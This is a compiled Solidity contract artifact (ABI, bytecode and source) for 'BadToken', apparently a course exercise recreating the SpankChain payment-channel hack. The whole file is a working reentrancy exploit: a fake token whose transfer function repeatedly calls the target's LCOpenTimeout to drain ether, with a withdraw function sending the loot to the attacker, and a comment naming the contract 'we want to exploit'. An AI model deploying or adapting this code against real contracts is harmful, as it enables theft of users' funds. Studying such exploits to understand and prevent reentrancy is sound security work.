{
  "contractName": "BadToken",
  "abi": [
    {
      "inputs": [
        {
          "name": "_target",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "openChannel",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_receiver",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_from",
          "type": "address"
        },
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527e390469ecab3c63eb15dfc6470ef63d139d417ab93f3fbc659e992c70913f1f60010260029060001916905534801561003c57600080fd5b506040516020806106db83398101806040528101908080519060200190929190505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506105eb806100f06000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe01461007a57806323b872dd146100a55780633ccfd60b1461012a57806389be87a1146101415780639e5faafc1461014b578063a9059cbb14610162575b005b34801561008657600080fd5b5061008f6101c7565b6040518082815260200191505060405180910390f35b3480156100b157600080fd5b50610110600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506101e6565b604051808215151515815260200191505060405180910390f35b34801561013657600080fd5b5061013f6101f3565b005b6101496102cf565b005b34801561015757600080fd5b5061016061043b565b005b34801561016e57600080fd5b506101ad600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506104ef565b604051808215151515815260200191505060405180910390f35b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000600190509392505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561024e57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102cc573d6000803e3d6000fd5b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663aeba142c3460025430600030604080519081016040528034815260200160648152506040518763ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018086600019166000191681526020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182600260200280838360005b838110156103f95780820151818401526020810190506103de565b50505050905001955050505050506000604051808303818588803b15801561042057600080fd5b505af1158015610434573d6000803e3d6000fd5b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16622e1d7e6002546040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260001916600019168152602001915050600060405180830381600087803b1580156104d557600080fd5b505af11580156104e9573d6000803e3d6000fd5b50505050565b60008060058110156105b457600181019050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16622e1d7e6002546040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260001916600019168152602001915050600060405180830381600087803b15801561059b57600080fd5b505af11580156105af573d6000803e3d6000fd5b505050505b6001915050929150505600a165627a7a72305820292ced065821775980c4fdf5130ccdc9738396a4a376c55b6d8a5a42a2cd06dc0029",
  "source": "pragma solidity ^0.4.23;\n\ncontract Channel {\n    function createChannel(\n        bytes32 _lcID,\n        address _partyI,\n        uint256 _confirmtime,\n        address _token,\n        uint256[2] _balances // [eth, token]\n    ) public payable;\n    \n    function LCOpenTimeout(bytes32 _lcID) public;\n}\n\ncontract BadToken {\n    address owner;\n    address target; // spankchain contract address we want to exploit\n    \n    // just a random 32 bytes used for the channelID\n    bytes32 data = bytes32(0x390469ecab3c63eb15dfc6470ef63d139d417ab93f3fbc659e992c70913f1f);\n    \n    constructor(address _target) public {\n        owner = msg.sender;\n        target = _target;\n    }\n    \n    function() public payable {\n        // Need this to accept the ether transfer\n    }\n    \n    function withdraw() public {\n        require(msg.sender == owner);\n        owner.transfer(address(this).balance);\n    }\n    \n    function getBalance() public view returns(uint256) {\n        return address(this).balance;\n    }\n    \n    function openChannel() public payable {\n        Channel(target).createChannel.value(msg.value)(data, address(this), 0, address(this), [uint256(msg.value), uint256(100)]);\n    }\n    \n    function attack() public {\n        Channel(target).LCOpenTimeout(data);\n    }\n    \n    function transfer(address _receiver, uint256 _amount) public returns(bool) {\n        uint callCount;\n        \n        if (callCount < 5) {\n            callCount += 1;\n            Channel(target).LCOpenTimeout(data);\n        }\n        return true;\n    }\n    \n    function transferFrom(address _from, address _to, uint256 _amount) public returns(bool) {\n        return true;\n    }\n}",
  "sourcePath": "/home/sdirix/Documents/eap/eth-accelerator-assignments/week4/spank-chain-hack/contracts/BadToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-12-20T20:28:16.853Z"
}